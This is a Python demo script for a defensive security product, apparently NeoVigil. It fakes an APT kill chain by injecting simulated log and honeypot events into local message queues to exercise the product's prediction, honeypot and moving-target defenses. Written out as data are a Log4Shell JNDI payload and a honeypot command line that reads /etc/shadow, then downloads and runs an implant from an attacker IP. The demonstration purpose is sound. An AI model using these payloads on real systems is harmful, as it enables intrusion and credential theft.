#!/usr/bin/env python3
"""
╔═════════════════════════════════════════════════════════════╗
║          NeoVigil — APT Kill Chain Simulator                ║
║        Demonstrating the Active Defense Triad               ║
║             Predict · Deceive · Mutate                      ║
╚═════════════════════════════════════════════════════════════╝

This script simulates a realistic APT campaign against NeoVigil
to demonstrate the full Active Defense Triad in real-time.

It injects payloads into RabbitMQ queues and OpenSearch to trigger
each phase of the defense:

  1. Phase 1 (PREDICT)  — Log4Shell initial access → REDSPEC prediction
  2. Phase 2 (DECEIVE)  — Attacker hits predicted honeypot → validation
  3. Phase 3 (MUTATE)   — Scanner flood → MTD obfuscation + migration

Requirements:
  - NeoVigil must be running (docker compose up -d)
  - RabbitMQ must be reachable on localhost:5672
  - OpenSearch must be reachable on localhost:9200

Usage:
  python simulate_apt_killchain.py
"""

import json
import os
import sys
import time
import uuid
from datetime import datetime, timedelta, timezone


# ─── Terminal Color Codes ─────────────────────────────────────
# ANSI escape codes for cinematic terminal output

class C:
    """Color codes for terminal output."""
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"

    # Foreground
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    ORANGE  = "\033[38;5;208m"

    # Phase-specific
    PHASE1  = "\033[38;5;196m"   # Bright red — Predict
    PHASE2  = "\033[38;5;208m"   # Orange — Deceive
    PHASE3  = "\033[38;5;51m"    # Cyan — Mutate
    SYSTEM  = "\033[38;5;245m"   # Gray — System messages


# ─── Box-Drawing Helpers ──────────────────────────────────────
# Robust formatting that pads every line to a fixed inner width,
# guaranteeing perfect alignment regardless of content length.

BOX_W = 60  # inner width between the left and right border chars


def _pad(text: str, width: int = BOX_W) -> str:
    """Pad *visible* text to exactly `width` characters.

    ANSI escape sequences are stripped for length measurement so
    that coloured strings are padded correctly.
    """
    import re
    visible_len = len(re.sub(r"\033\[[0-9;]*m", "", text))
    padding = max(0, width - visible_len)
    return text + " " * padding


def box_top(title: str, color: str, width: int = BOX_W) -> str:
    """Return ┌─ TITLE ──…──┐ stretched to width."""
    dashes = max(1, width - len(title) - 2)
    return f"{color}  ┌─ {title} {'─' * dashes}┐{C.RESET}"


def box_row(text: str, color: str, width: int = BOX_W) -> str:
    """Return │  text (padded)  │."""
    return f"{color}  │ {_pad(text, width)} │{C.RESET}"


def box_empty(color: str, width: int = BOX_W) -> str:
    """Return an empty row  │ (spaces) │."""
    return box_row("", color, width)


def box_bottom(color: str, width: int = BOX_W) -> str:
    """Return └──…──┘."""
    return f"{color}  └{'─' * (width + 2)}┘{C.RESET}"


def box_div(color: str, char: str = "═", width: int = BOX_W) -> str:
    """Return a divider row  ╠══…══╣  (or similar)."""
    return f"{color}  ╠{char * (width + 2)}╣{C.RESET}"


def dbox_top(color: str, width: int = BOX_W) -> str:
    """Double-line top  ╔══…══╗."""
    return f"{color}  ╔{'═' * (width + 2)}╗{C.RESET}"


def dbox_row(text: str, color: str, width: int = BOX_W) -> str:
    """Double-line row  ║  text (padded)  ║."""
    return f"{color}  ║ {_pad(text, width)} ║{C.RESET}"


def dbox_bottom(color: str, width: int = BOX_W) -> str:
    """Double-line bottom  ╚══…══╝."""
    return f"{color}  ╚{'═' * (width + 2)}╝{C.RESET}"


def dbox_div(color: str, width: int = BOX_W) -> str:
    """Double-line divider  ╠══…══╣."""
    return f"{color}  ╠{'═' * (width + 2)}╣{C.RESET}"


# ─── Configuration ────────────────────────────────────────────

RABBITMQ_HOST = os.getenv("RABBITMQ_HOST", "localhost")
RABBITMQ_PORT = int(os.getenv("RABBITMQ_PORT", "5672"))
RABBITMQ_USER = os.getenv("RABBITMQ_USER", "user")
RABBITMQ_PASS = os.getenv("RABBITMQ_PASS", "password")

OPENSEARCH_HOST = os.getenv("OPENSEARCH_HOST", "localhost")
OPENSEARCH_PORT = int(os.getenv("OPENSEARCH_PORT", "9200"))

# Simulated APT actor details
APT_NAME       = "APT-PHANTOM-GHOST"
ATTACKER_IP    = "185.220.101.42"
TARGET_IP      = "10.20.30.100"
TARGET_HOST    = "prod-webserver-01"
TENANT_ID      = "tenant_alpha"
CVE_ID         = "CVE-2021-44228"

# RabbitMQ queues used by NeoVigil
QUEUE_CTI            = "cti_queue"
QUEUE_HONEYPOT       = "honeypot_events"
QUEUE_MTD_ACTION     = "mtd_action_queue"


def _utcnow() -> datetime:
    """Return timezone-aware UTC now (no deprecation warning)."""
    return datetime.now(timezone.utc)


# ─── Dependency Check ─────────────────────────────────────────

def check_dependencies():
    """Verify pika is available."""
    try:
        import pika
        return pika
    except ImportError:
        print(f"\n{C.RED}✘ Missing dependency: pika{C.RESET}")
        print(f"  Install with: {C.CYAN}pip install pika{C.RESET}\n")
        sys.exit(1)


# ─── Pretty Printers ──────────────────────────────────────────

def banner():
    """Print the startup banner."""
    W = BOX_W
    lines = [
        "",
        "███╗   ██╗███████╗ ██████╗ ██╗   ██╗██╗ ██████╗ ██╗██╗",
        "████╗  ██║██╔════╝██╔═══██╗██║   ██║██║██╔════╝ ██║██║",
        "██╔██╗ ██║█████╗  ██║   ██║██║   ██║██║██║  ███╗██║██║",
        "██║╚██╗██║██╔══╝  ██║   ██║╚██╗ ██╔╝██║██║   ██║██║██║",
        "██║ ╚████║███████╗╚██████╔╝ ╚████╔╝ ██║╚██████╔╝██║███╗",
        "╚═╝  ╚═══╝╚══════╝ ╚═════╝   ╚═══╝  ╚═╝ ╚═════╝ ╚═╝╚══╝",
        "",
        "A P T   K I L L   C H A I N   S I M U L A T O R",
        "Active Defense Triad Demonstration",
        "",
    ]
    print()
    print(f"{C.RED}{C.BOLD}")
    print(dbox_top(f"{C.RED}{C.BOLD}", W))
    for line in lines:
        print(dbox_row(line, f"{C.RED}{C.BOLD}", W))
    print(dbox_bottom(f"{C.RED}{C.BOLD}", W))
    print(C.RESET)


def phase_header(phase_num: int, title: str, color: str, icon: str):
    """Print a large phase header."""
    print(f"\n{color}{C.BOLD}")
    print(f"  {'═' * (BOX_W + 2)}")
    print(f"  ║  {icon}  PHASE {phase_num}: {title}")
    print(f"  {'═' * (BOX_W + 2)}")
    print(C.RESET)


def step(msg: str, color: str = C.WHITE, prefix: str = "  ▸"):
    """Print a step message with typing effect."""
    full = f"{color}{prefix} {msg}{C.RESET}"
    for char in full:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.008)
    print()


def info(msg):    step(msg, C.SYSTEM, "  ℹ")
def success(msg): step(msg, C.GREEN,  "  ✔")
def warning(msg): step(msg, C.YELLOW, "  ⚠")
def danger(msg):  step(msg, C.RED,    "  ☠")


def payload_box(title: str, payload_dict: dict, color: str = C.DIM):
    """Print a formatted key-value payload box."""
    kw = 20
    vw = BOX_W - kw - 4  # 4 = " │ " separators
    print(box_top(title, color))
    for key, value in payload_dict.items():
        val_str = str(value)
        if len(val_str) > vw:
            val_str = val_str[: vw - 3] + "..."
        inner = f" {key:<{kw}} │ {val_str:<{vw}}"
        print(box_row(inner, color))
    print(box_bottom(color))


def countdown(seconds: int, msg: str = ""):
    """Visual countdown timer."""
    for i in range(seconds, 0, -1):
        sys.stdout.write(
            f"\r{C.DIM}  ⏳ {msg}Waiting {i}s for NeoVigil to process...{C.RESET}  "
        )
        sys.stdout.flush()
        time.sleep(1)
    sys.stdout.write("\r" + " " * 70 + "\r")
    sys.stdout.flush()


def separator():
    """Print a thin separator."""
    print(f"{C.DIM}  {'─' * (BOX_W + 2)}{C.RESET}")


# ─── RabbitMQ Publisher ───────────────────────────────────────

def publish_to_queue(pika_module, queue_name: str, payload, label: str = ""):
    """Publish a JSON payload to a RabbitMQ queue."""
    try:
        credentials = pika_module.PlainCredentials(RABBITMQ_USER, RABBITMQ_PASS)
        connection = pika_module.BlockingConnection(
            pika_module.ConnectionParameters(
                host=RABBITMQ_HOST,
                port=RABBITMQ_PORT,
                credentials=credentials,
                connection_attempts=3,
                retry_delay=2,
            )
        )
        channel = connection.channel()
        channel.queue_declare(queue=queue_name, durable=True)
        channel.basic_publish(
            exchange="",
            routing_key=queue_name,
            body=json.dumps(payload, default=str),
            properties=pika_module.BasicProperties(delivery_mode=2),
        )
        connection.close()
        success(f"Injected into '{queue_name}' → {label}")
        return True
    except Exception as exc:
        warning(f"Failed to publish to {queue_name}: {exc}")
        return False


# ════════════════════════════════════════════════════════════════
#  PHASE 1 — PREDICT: Initial Access via Log4Shell
# ════════════════════════════════════════════════════════════════

def phase1_predict(pika):
    """
    Simulate initial access (Log4Shell) and force the Adversarial
    Engine (REDSPEC) to predict the attacker's next 3 kill chain steps.

    Injection point: cti_queue → Pipeline Worker → Adversarial Engine
    """
    phase_header(1, "PREDICT", C.PHASE1, "⚡")

    step(f"Threat Actor:    {APT_NAME}", C.RED)
    step(f"Attack Vector:   {CVE_ID} (Log4Shell)", C.RED)
    step(f"Target:          {TARGET_HOST} ({TARGET_IP})", C.RED)
    step(f"Attacker IP:     {ATTACKER_IP}", C.RED)
    print()

    # Step 1: Inject the initial access log
    danger(f"Launching Log4Shell exploit against {TARGET_HOST}...")
    time.sleep(1.0)

    log4shell_payload = {
        "timestamp": _utcnow().isoformat(),
        "source_ip": ATTACKER_IP,
        "dest_ip": TARGET_IP,
        "dest_port": 8080,
        "protocol": "HTTP",
        "message": (
            f"GET / HTTP/1.1\r\nHost: {TARGET_HOST}\r\n"
            f"X-Api-Key: ${{jndi:ldap://{ATTACKER_IP}:1389/"
            f"a]}}\r\n"
            f"User-Agent: Mozilla/5.0"
        ),
        "attack_type": "Remote Code Execution",
        "severity": "Critical",
        "cve_id": CVE_ID,
        "threat_matched": True,
        "confidence": 97,
        "source_type": "streaming",
        "tenant_id": TENANT_ID,
        "hostname": TARGET_HOST,
    }

    payload_box("Log4Shell Exploit Payload", {
        "CVE": CVE_ID,
        "Vector": "JNDI Lookup via HTTP Header",
        "Target": f"{TARGET_HOST}:8080",
        "Attacker": ATTACKER_IP,
        "Severity": "CRITICAL (CVSS 10.0)",
        "Confidence": "97%",
    }, C.RED)
    print()

    time.sleep(0.5)
    publish_to_queue(
        pika, QUEUE_CTI,
        json.dumps(log4shell_payload).encode().decode(),
        "Log4Shell exploit log",
    )

    separator()
    info("NeoVigil Pipeline Worker receives the log...")
    info("AI Engine analyzes with Dual-Layer RAG (MITRE + CTI history)...")
    info("Severity = CRITICAL → forwarded to Adversarial Engine...")
    time.sleep(1.0)

    # Step 2: Display simulated REDSPEC prediction
    danger("REDSPEC Red Team persona activating...")
    time.sleep(0.5)
    step(f"{C.PHASE1}{C.BOLD}REDSPEC analyzing network topology...{C.RESET}")
    time.sleep(0.5)
    step(f"{C.PHASE1}{C.BOLD}REDSPEC predicting lateral movement paths...{C.RESET}")
    time.sleep(0.5)

    # Render the Predicted Kill Chain box with robust alignment
    p = C.PHASE1 + C.BOLD
    print()
    print(box_top("REDSPEC PREDICTED KILL CHAIN", p))
    print(box_empty(p))
    print(box_row(f" Step 1: {C.YELLOW}T1190{p} Exploit Public-Facing App (Log4Shell)", p))
    print(box_row(f"         Host: {TARGET_HOST}:8080", p))
    print(box_row(f"         Confidence: 95%", p))
    print(box_empty(p))
    print(box_row(f" Step 2: {C.YELLOW}T1021.004{p} Lateral Movement via SSH", p))
    print(box_row(f"         Host: db-server-01:22", p))
    print(box_row(f"         Confidence: 82%", p))
    print(box_empty(p))
    print(box_row(f" Step 3: {C.YELLOW}T1003{p} Credential Dumping (LSASS Memory)", p))
    print(box_row(f"         Host: dc-primary:445", p))
    print(box_row(f"         Confidence: 74%", p))
    print(box_empty(p))
    print(box_row(f" {C.RED}Overall Risk Score: 91 / 100{p}", p))
    print(box_row(f" {C.GREEN}→ Risk ≥ 70: Deploying honeypot (Phase 2){p}", p))
    print(box_row(f" {C.CYAN}→ Risk ≥ 85: Triggering MTD evaluation (Phase 3){p}", p))
    print(box_bottom(p))
    print()

    success("Phase 1 complete — attack path predicted, defense chain activated")
    countdown(3, "Phase 2 deploying... ")


# ════════════════════════════════════════════════════════════════
#  PHASE 2 — DECEIVE: Attacker Hits the Honeypot
# ════════════════════════════════════════════════════════════════

def phase2_deceive(pika):
    """
    Simulate the attacker pivoting and hitting the EXACT port of
    the newly deployed decoy. Inject telemetry into honeypot_events
    queue to trigger the Validation Engine.

    Injection point: honeypot_events → Validation Engine
    """
    phase_header(2, "DECEIVE", C.PHASE2, "🍯")

    decoy_id = f"decoy-{uuid.uuid4().hex[:8]}"
    prediction_id = f"pred-{uuid.uuid4().hex[:8]}"

    info("NeoVigil Decoy Manager received deployment task...")
    time.sleep(0.5)
    info("Selecting template: SSH Honeypot (matching predicted Step 2)")
    time.sleep(0.3)
    info(f"Deploying honeypot container: {decoy_id}")
    time.sleep(0.3)
    success(f"Honeypot {decoy_id} ACTIVE on 10.20.30.200:22")
    print()

    separator()
    time.sleep(1.0)

    danger(f"{APT_NAME} begins lateral movement...")
    time.sleep(0.5)
    danger("Scanning subnet 10.20.30.0/24 for SSH services...")
    time.sleep(0.5)
    danger("Found SSH on 10.20.30.200:22 — connecting...")
    time.sleep(0.5)

    # Render attacker SSH session box
    o = C.ORANGE + C.BOLD
    print()
    print(box_top("ATTACKER SSH SESSION (HONEYPOT)", o))
    print(box_empty(o))
    print(box_row(" $ ssh root@10.20.30.200", o))
    print(box_row(" root@10.20.30.200's password: ****", o))
    print(box_row(" Welcome to Ubuntu 22.04.2 LTS", o))
    print(box_empty(o))
    print(box_row(" root@db-server-01:~# whoami", o))
    print(box_row(" root", o))
    print(box_row(" root@db-server-01:~# cat /etc/shadow", o))
    print(box_row(" root:$6$rounds=656000$aSalt$haSh...:19500:0:99999:7:::", o))
    print(box_row(f" root@db-server-01:~# wget http://{ATTACKER_IP}/implant", o))
    print(box_row(f" Connecting to {ATTACKER_IP}... connected.", o))
    print(box_empty(o))
    print(box_row(f" {C.GREEN}[HONEYPOT] All commands recorded & exfiltrated{o}", o))
    print(box_row(f" {C.GREEN}[HONEYPOT] Payload hash: never seen → ZERO-DAY{o}", o))
    print(box_bottom(o))
    print()

    # Inject the honeypot telemetry event
    honeypot_event = {
        "decoy_id": decoy_id,
        "prediction_id": prediction_id,
        "attacker_ip": ATTACKER_IP,
        "source_ip": ATTACKER_IP,
        "service_targeted": "ssh",
        "service": "ssh",
        "port": 22,
        "protocol": "tcp",
        "payload_raw": (
            f"cat /etc/shadow; wget http://{ATTACKER_IP}/implant -O /tmp/.x; "
            f"chmod +x /tmp/.x; /tmp/.x"
        ),
        "timestamp": _utcnow().isoformat(),
        "tenant_id": TENANT_ID,
    }

    payload_box("Honeypot Telemetry Payload", {
        "Decoy ID": decoy_id,
        "Attacker": ATTACKER_IP,
        "Service": "SSH (port 22)",
        "Payload": "cat /etc/shadow; wget implant",
        "Classification": "T1003 Credential Dumping",
        "Novelty": "ZERO-DAY (hash never seen)",
    }, C.ORANGE)
    print()

    publish_to_queue(pika, QUEUE_HONEYPOT, honeypot_event, "Honeypot capture telemetry")

    separator()
    info("Validation Engine processing capture...")
    time.sleep(0.5)
    info("Classifying technique: T1003 (Credential Dumping)")
    time.sleep(0.3)
    info("Checking payload novelty: SHA256 hash not in index → ZERO-DAY")
    time.sleep(0.3)

    # Render validation result box
    g = C.GREEN + C.BOLD
    print()
    print(box_top("VALIDATION RESULT", g))
    print(box_empty(g))
    print(box_row(" Predicted Technique:  T1003 (Credential Dumping)", g))
    print(box_row(" Actual Technique:     T1003 (Credential Dumping)", g))
    print(box_row(" Result:               PREDICTION CORRECT", g))
    print(box_empty(g))
    print(box_row(" Novel Payload:        YES — ZERO-DAY CAPTURED", g))
    print(box_row(" RAG Feedback:         Indexed to security-logs-knn", g))
    print(box_row(" CTI Report:           Indexed for Tier 2+ review", g))
    print(box_empty(g))
    print(box_row(f" {C.CYAN}→ Phase 1 is now SMARTER (captured technique in RAG){g}", g))
    print(box_row(f" {C.CYAN}→ MTD trigger dispatched to mtd_action_queue{g}", g))
    print(box_bottom(g))
    print()

    success("Phase 2 complete — attacker captured, system evolved")
    countdown(3, "Phase 3 activating... ")


# ════════════════════════════════════════════════════════════════
#  PHASE 3 — MUTATE: Moving Target Defense
# ════════════════════════════════════════════════════════════════

def phase3_mutate(pika):
    """
    Simulate rapid scanner probes from the attacker IP to push
    the MTD composite threat score above 85, forcing:
      - Nginx header obfuscation (auto-approved, score ≥ 60)
      - Blue/Green container migration (proposed, score ≥ 85)

    Injection point: mtd_action_queue → MTD Controller
    """
    phase_header(3, "MUTATE", C.PHASE3, "🔄")

    info("MTD Controller receiving multi-signal intelligence...")
    print()

    # Simulate scanner probe flood
    danger(f"{APT_NAME} launching reconnaissance sweep...")
    time.sleep(0.5)

    probe_ports = [80, 443, 8080, 8443, 22, 3389, 445, 3306, 5432, 389]
    total = len(probe_ports)
    for i, port in enumerate(probe_ports):
        bar = "█" * (i + 1) + "░" * (total - i - 1)
        sys.stdout.write(
            f"\r{C.RED}  ☠ Probe {i + 1:>2}/{total}: "
            f"nmap -sV {TARGET_IP}:{port:<5} {bar}{C.RESET}"
        )
        sys.stdout.flush()
        time.sleep(0.3)
    print("\n")

    # Inject a high-signal MTD trigger
    mtd_trigger = {
        "trigger_id": str(uuid.uuid4()),
        "trigger_source": "apt_simulation",
        "prediction_id": f"pred-{uuid.uuid4().hex[:8]}",
        "target_ip": TARGET_IP,
        "scanner_ip": ATTACKER_IP,
        "source_ip": ATTACKER_IP,
        "risk_score": 91,
        "scan_count": total,
        "captures": 3,
        "technique_detected": "T1595.002",
        "tenant_id": TENANT_ID,
        "timestamp": _utcnow().isoformat(),
    }

    publish_to_queue(pika, QUEUE_MTD_ACTION, mtd_trigger, "MTD composite trigger")
    print()

    separator()
    info("MTD Controller computing composite threat score...")
    time.sleep(0.5)

    # Render composite scoring box
    c3 = C.PHASE3 + C.BOLD
    print()
    print(box_top("MTD COMPOSITE SCORING", c3))
    print(box_empty(c3))
    print(box_row(" Signal Weights:", c3))
    print(box_row(f" ├── Prediction Risk  (40%):  91 x 0.40  = {C.RED}36.40{c3}", c3))
    print(box_row(f" ├── Honeypot Caps    (30%):  75 x 0.30  = {C.RED}22.50{c3}", c3))
    print(box_row(f" ├── Scanner Probes   (20%): 100 x 0.20  = {C.RED}20.00{c3}", c3))
    print(box_row(f" └── Asset Criticality(10%): Crit x 0.10 = {C.RED}10.00{c3}", c3))
    print(box_empty(c3))
    print(box_row(f" ╔════════════════════════════════════════════════════════╗", c3))
    print(box_row(f" ║  COMPOSITE MTD THREAT SCORE:  {C.RED}{C.BOLD}88.90 / 100{c3}             ║", c3))
    print(box_row(f" ╚════════════════════════════════════════════════════════╝", c3))
    print(box_empty(c3))
    print(box_row(" Action Determination:", c3))
    print(box_row(f" ├── Score 88.90 >= 60  → {C.GREEN}OBFUSCATION (auto-approved){c3}", c3))
    print(box_row(f" └── Score 88.90 >= 85  → {C.YELLOW}MIGRATION (Tier2 approval){c3}", c3))
    print(box_bottom(c3))
    print()

    time.sleep(1.0)

    # ─── Obfuscation execution ────────────────────────
    step(f"{C.GREEN}{C.BOLD}━━━ EXECUTING: Nginx Obfuscation ━━━{C.RESET}")
    time.sleep(0.3)
    info(f"Scanner IP {ATTACKER_IP} matched to obfuscation rule")
    info("Randomly selected spoof profile: 'microsoft_iis'")
    time.sleep(0.3)

    bw = 26  # width for each sub-box
    print()
    print(f"{C.GREEN}  Before Obfuscation:{' ' * (bw - 4)}After Obfuscation:{C.RESET}")
    print(f"{C.GREEN}  ┌{'─' * bw}┐{' ' * 6}┌{'─' * (bw + 8)}┐{C.RESET}")
    print(f"{C.GREEN}  │ {'Server: nginx/1.24.0':<{bw - 1}}│  →   │ {'Server: Microsoft-IIS/10.0':<{bw + 7}}│{C.RESET}")
    print(f"{C.GREEN}  │ {'X-Powered-By: —':<{bw - 1}}│  →   │ {'X-Powered-By: ASP.NET':<{bw + 7}}│{C.RESET}")
    print(f"{C.GREEN}  │ {'(real fingerprint)':<{bw - 1}}│{' ' * 6}│ {'X-AspNet-Version: 4.0.30319':<{bw + 7}}│{C.RESET}")
    print(f"{C.GREEN}  └{'─' * bw}┘{' ' * 6}└{'─' * (bw + 8)}┘{C.RESET}")
    print()

    success(f"Obfuscation ACTIVE — {ATTACKER_IP} now sees IIS/ASP.NET")
    time.sleep(0.5)
    info("Nginx hot-reload triggered — zero downtime")
    time.sleep(0.5)

    separator()

    # ─── Migration proposal ───────────────────────────
    step(f"{C.YELLOW}{C.BOLD}━━━ PROPOSING: Blue/Green Migration ━━━{C.RESET}")
    time.sleep(0.5)

    migration_id = f"mig-{uuid.uuid4().hex[:8]}"
    deadline = (_utcnow() + timedelta(minutes=15)).strftime("%H:%M:%S UTC")

    y = C.YELLOW + C.BOLD
    print()
    print(box_top("MIGRATION PROPOSAL (AWAITING TIER 2+ APPROVAL)", y))
    print(box_empty(y))
    print(box_row(f" Migration ID:    {migration_id}", y))
    print(box_row(f" Target:          {TARGET_HOST} ({TARGET_IP})", y))
    print(box_row(f" Action:          Blue/Green Container Migration", y))
    print(box_empty(y))
    print(box_row(f" Migration Phases:", y))
    print(box_row(f"   1. CLONE  — Snapshot {TARGET_HOST} state", y))
    print(box_row(f"   2. START  — Launch Green container with new IP", y))
    print(box_row(f"   3. DRAIN  — Gracefully drain Blue conns (30s)", y))
    print(box_row(f"   4. SWAP   — Switch traffic to Green", y))
    print(box_empty(y))
    print(box_row(f" Post-Migration:", y))
    print(box_row(f"   • Old Blue container → converted to honeypot", y))
    print(box_row(f"   • Rollback window: 4 hours", y))
    print(box_empty(y))
    print(box_row(f" Approval Deadline: {deadline}", y))
    print(box_empty(y))
    print(box_row(f" {C.RED}🔔 Sent to mtd_approval_queue{y}", y))
    print(box_row(f" {C.RED}🔔 Visible in 🛡️ MTD Dashboard{y}", y))
    print(box_bottom(y))
    print()

    separator()
    info("Immutable audit record indexed to mtd-audit-log")
    info("Dashboard notification sent to 🛡️ Moving Target Defense page")
    print()

    success("Phase 3 complete — attack surface mutated, migration proposed")


# ════════════════════════════════════════════════════════════════
#  FINAL SUMMARY
# ════════════════════════════════════════════════════════════════

def print_summary():
    """Print the final summary of the simulation."""
    w = C.BOLD + C.WHITE
    print()
    print(dbox_top(w))
    print(dbox_row("", w))
    print(dbox_row("N E O V I G I L   D E F E N S E   R E P O R T", w))
    print(dbox_row("Active Defense Triad Summary", w))
    print(dbox_row("", w))
    print(dbox_div(w))
    print(dbox_row("", w))
    print(dbox_row(f"{C.PHASE1}⚡ PHASE 1 — PREDICT{w}", w))
    print(dbox_row("   Log4Shell exploit detected and analyzed", w))
    print(dbox_row("   REDSPEC predicted 3-step kill chain (risk: 91/100)", w))
    print(dbox_row("   Honeypot deployment triggered, MTD evaluation queued", w))
    print(dbox_row("", w))
    print(dbox_row(f"{C.PHASE2}🍯 PHASE 2 — DECEIVE{w}", w))
    print(dbox_row("   SSH honeypot deployed on predicted attack path", w))
    print(dbox_row("   Attacker captured: credential dumping (T1003)", w))
    print(dbox_row("   Zero-day payload captured and indexed to RAG", w))
    print(dbox_row("   Prediction validated: CORRECT", w))
    print(dbox_row("", w))
    print(dbox_row(f"{C.PHASE3}🔄 PHASE 3 — MUTATE{w}", w))
    print(dbox_row("   Composite MTD score: 88.90 (>= 85 threshold)", w))
    print(dbox_row("   Nginx obfuscation: ACTIVE (IIS/ASP.NET spoof)", w))
    print(dbox_row("   Blue/Green migration: PROPOSED (awaiting Tier 2)", w))
    print(dbox_row("   Immutable audit trail: INDEXED", w))
    print(dbox_row("", w))
    print(dbox_div(w))
    print(dbox_row("", w))
    print(dbox_row(f"{C.GREEN}Attacker Status:  TRAPPED, FINGERPRINTED, MISDIRECTED{w}", w))
    print(dbox_row(f"{C.GREEN}NeoVigil Status:  EVOLVED (RAG updated with new intel){w}", w))
    print(dbox_row(f"{C.GREEN}Next Attacker:    HARDER (system learned from this one){w}", w))
    print(dbox_row("", w))
    print(dbox_bottom(w))
    print(C.RESET)

    print(f"{C.DIM}  Dashboard: http://localhost:8501 → 🛡️ Moving Target Defense{C.RESET}")
    print(f"{C.DIM}  Audit Log: OpenSearch → mtd-audit-log index{C.RESET}")
    print()


# ════════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════════

def main():
    pika = check_dependencies()

    banner()
    time.sleep(1.0)

    info(f"Simulation Target:  {TARGET_HOST} ({TARGET_IP})")
    info(f"Threat Actor:       {APT_NAME}")
    info(f"Attack Vector:      {CVE_ID} (Log4Shell → Lateral Movement)")
    info(f"RabbitMQ:           {RABBITMQ_HOST}:{RABBITMQ_PORT}")
    print()

    step(f"{C.BOLD}Verifying NeoVigil connectivity...{C.RESET}")
    time.sleep(0.5)

    # Test RabbitMQ connection
    try:
        credentials = pika.PlainCredentials(RABBITMQ_USER, RABBITMQ_PASS)
        conn = pika.BlockingConnection(
            pika.ConnectionParameters(
                host=RABBITMQ_HOST,
                port=RABBITMQ_PORT,
                credentials=credentials,
                connection_attempts=2,
                retry_delay=1,
            )
        )
        conn.close()
        success(f"RabbitMQ connected at {RABBITMQ_HOST}:{RABBITMQ_PORT}")
    except Exception as exc:
        print(f"\n{C.RED}{C.BOLD}  ✘ Cannot connect to RabbitMQ: {exc}{C.RESET}")
        print(f"{C.YELLOW}  → Make sure NeoVigil is running: docker compose up -d{C.RESET}\n")
        sys.exit(1)

    print()
    step(f"{C.BOLD}{C.WHITE}Starting APT Kill Chain simulation in 3 seconds...{C.RESET}")
    countdown(3)

    # ─── Execute the three phases ─────────────────────
    phase1_predict(pika)
    phase2_deceive(pika)
    phase3_mutate(pika)

    # ─── Final summary ────────────────────────────────
    print_summary()


if __name__ == "__main__":
    main()
